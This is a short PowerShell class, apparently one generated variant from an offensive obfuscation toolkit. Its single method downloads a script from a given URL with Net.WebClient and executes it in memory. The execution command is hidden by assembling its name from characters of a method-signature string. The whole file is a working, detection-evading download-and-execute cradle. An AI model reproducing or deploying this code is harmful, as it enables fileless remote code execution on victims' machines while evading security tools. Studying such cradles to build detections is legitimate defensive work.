Class ObfDownloadFileContent15 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\9
        .( ([String]''.LastIndexOf)[138,466,86]-Join'')(New-Object Net.WebClient).DownloadString($url)
    }

}